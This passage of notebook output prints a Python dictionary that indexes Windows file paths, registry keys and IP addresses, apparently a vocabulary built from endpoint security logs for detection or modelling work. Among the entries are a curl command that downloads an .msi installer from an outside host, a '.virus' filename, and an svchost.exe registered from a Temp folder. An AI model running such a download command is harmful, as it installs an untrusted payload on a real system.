       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Edge Shopping\\\\*': 288,\n",
       " '92001e9cebec0f0f0ac2b7c7e04f017d.virus': 289,\n",
       " 'wlua5.1.exe': 290,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\active-directory\\\\.git': 291,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser': 292,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache\\\\.git': 293,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_tw.yahoo.com_0.indexeddb.blob\\\\.git': 294,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\353698': 295,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\AC\\\\Temp': 296,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Local\\\\Microsoft': 297,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\AC\\\\*': 298,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 299,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\BackgroundTransferApi': 300,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\he': 301,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\*': 302,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\tr\\\\*': 303,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\*': 304,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\BackgroundTransferApi\\\\*': 305,\n",
       " 'C:\\\\Users\\\\david67': 306,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\AC\\\\INetCache': 307,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC\\\\*': 308,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sv': 309,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\Pictures\\\\Saved Pictures\\\\.git': 310,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\TempState': 311,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\*': 312,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\zh_TW\\\\.git': 313,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ECApp_8wekyb3d8bbwe\\\\*': 314,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC': 315,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\it': 316,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\J15GVKBA': 317,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers\\\\C:\\\\Users\\\\jensenderek\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe': 318,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\SystemAppData\\\\*': 319,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Latn-RS': 320,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\LocalState': 321,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\*': 322,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\be\\\\*': 323,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 324,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\TokenBroker\\\\*': 325,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\zh_TW': 326,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\LocalCache\\\\*': 327,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AppData\\\\*': 328,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\CEF-Log-Analytics-Agent\\\\scripts\\\\*': 329,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\zh_HK\\\\*': 330,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\AutofillStrikeDatabase\\\\.git': 331,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 332,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\*': 333,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\CustomDestinations': 334,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetCache': 335,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 336,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pl-PL\\\\*': 337,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ShellFeeds\\\\.git': 338,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\events': 339,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\RoamingState': 340,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ig-NG\\\\*': 341,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\.git': 342,\n",
       " '152.199.5.13': 343,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\*': 344,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\SystemAppData': 345,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\LocalState': 346,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default': 347,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_ntp.msn.com_0.indexeddb.leveldb\\\\*': 348,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\LocalCache': 349,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\az-Latn-AZ': 350,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache\\\\*': 351,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 352,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 353,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\sv\\\\*': 354,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Apps_{98de8edc-74de-4f3b-a702-e9c35c538fda}\\\\.git': 355,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\index-dir\\\\*': 356,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\se': 357,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\es': 358,\n",
       " 'smona132175062315590385642': 359,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AC\\\\INetCookies': 360,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data\\\\LevelDB\\\\*': 361,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Snapshots\\\\*': 362,\n",
       " 'C:\\\\Windows\\\\System32\\\\Curl.exe -k http://enlacelaboral.com/3cKldxdt/AhIaKCwxEn8qPXsYQn12eWR6endleGV9fQ== -o 27bf5ef8.msi': 363,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\AC\\\\*': 364,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CallingShellApp_cw5n1h2txyewy\\\\AppData\\\\.git': 365,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\da\\\\*': 366,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 367,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-TT\\\\.git': 368,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\LocalState\\\\.git': 369,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\2ZK7K4M1\\\\*': 370,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_metadata\\\\.git': 371,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 372,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\az-Latn-AZ': 373,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ca\\\\.git': 374,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\nl': 375,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-AU\\\\*': 376,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\.git': 377,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 378,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 379,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe': 380,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 381,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Mozilla\\\\*': 382,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\fr_CA\\\\.git': 383,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\Desktop\\\\.git': 384,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\my\\\\.git': 385,\n",
       " 'C:\\\\Users\\\\benjamin99\\\\Downloads\\\\GoToAssist.exe:Zone.Identifier': 386,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy': 387,\n",
       " 'C:\\\\Users\\\\bmoore\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\syslog': 388,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ms\\\\.git': 389,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache': 390,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\Personal\\\\FeedbackHub': 391,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Safety\\\\edge\\\\local\\\\local': 392,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\.git': 393,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{5CE4A5E9-E4EB-479D-B89F-130C02886155}\\\\LocalizedName': 394,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-AE': 395,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\Settings\\\\*': 396,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\94.0.992.47\\\\Default\\\\AutofillStrikeDatabase\\\\.git': 397,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\def\\\\Session Storage\\\\.git': 398,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 399,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\TempState\\\\*': 400,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\*': 401,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\LocalCache': 402,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 403,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\TempState\\\\.git': 404,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\LocalState': 405,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\AC\\\\.git': 406,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pt_PT\\\\.git': 407,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\*': 408,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fr\\\\*': 409,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sv-SE': 410,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 411,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\LocalLow\\\\Microsoft\\\\Internet Explorer\\\\EdpDomStore\\\\.git': 412,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\Temp': 413,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\LocalState\\\\*': 414,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe': 415,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalState\\\\Logs\\\\.git': 416,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\Favicons\\\\*': 417,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\pnacl\\\\*': 418,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 419,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\LocalState': 420,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory': 421,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\RoamingState': 422,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AppData': 423,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}': 424,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-QA\\\\.git': 425,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\bg': 426,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\OptimizationGuidePredictionModels\\\\OPTIMIZATION_TARGET_LANGUAGE_DETECTION_2203162232\\\\*': 427,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pl-PL': 428,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338388': 429,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\bg\\\\*': 430,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_ntp.msn.com_0.indexeddb.leveldb\\\\.git': 431,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\314559\\\\*': 432,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\*': 433,\n",
       " '23.1.236.18': 434,\n",
       " 'C:\\\\Users\\\\angela76\\\\Desktop\\\\Sysmon\\\\.git': 435,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-PE\\\\*': 436,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 437,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 438,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-HN\\\\.git': 439,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\es\\\\.git': 440,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\AC\\\\*': 441,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache': 442,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AC\\\\INetHistory': 443,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe': 444,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ur\\\\*': 445,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\pt_PT': 446,\n",
